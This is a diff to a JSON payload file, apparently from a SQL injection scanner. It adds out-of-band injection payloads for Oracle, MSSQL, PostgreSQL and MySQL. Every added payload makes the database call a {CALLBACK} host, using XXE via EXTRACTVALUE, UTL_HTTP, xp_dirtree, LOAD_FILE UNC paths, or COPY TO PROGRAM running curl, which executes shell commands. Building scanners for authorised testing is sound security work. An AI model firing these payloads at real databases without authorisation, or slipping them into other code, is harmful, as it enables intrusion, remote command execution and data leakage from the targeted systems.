@@ -228,5 +228,40 @@
       "valid": "xyz' AND 1=(SELECT 1)--",
       "bad": "xyz' AND 1=(SELECT 1 FROM not_a_real_table_xyzzy)--"
     }
+  },
+  "oob_payloads": {
+    "Oracle": [
+      {
+        "payload": "x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{CALLBACK}/\"> %remote;]>'),'/l')+FROM+dual--",
+        "type": "OOB XXE via EXTRACTVALUE",
+        "technique": "xxe_dns"
+      },
+      {
+        "payload": "'||(SELECT UTL_HTTP.REQUEST('http://{CALLBACK}/') FROM dual)||'",
+        "type": "OOB via UTL_HTTP",
+        "technique": "http_request"
+      }
+    ],
+    "MSSQL": [
+      {
+        "payload": "'; EXEC master..xp_dirtree '//{CALLBACK}/a';--",
+        "type": "OOB via xp_dirtree",
+        "technique": "unc_path"
+      }
+    ],
+    "PostgreSQL": [
+      {
+        "payload": "'; COPY (SELECT 1) TO PROGRAM 'curl http://{CALLBACK}/';--",
+        "type": "OOB via COPY TO PROGRAM",
+        "technique": "cmd_exec"
+      }
+    ],
+    "MySQL": [
+      {
+        "payload": "' OR LOAD_FILE(CONCAT('\\\\\\\\','{CALLBACK}','\\\\abc'))-- ",
+        "type": "OOB via LOAD_FILE",
+        "technique": "unc_path"
+      }
+    ]
   }
 }
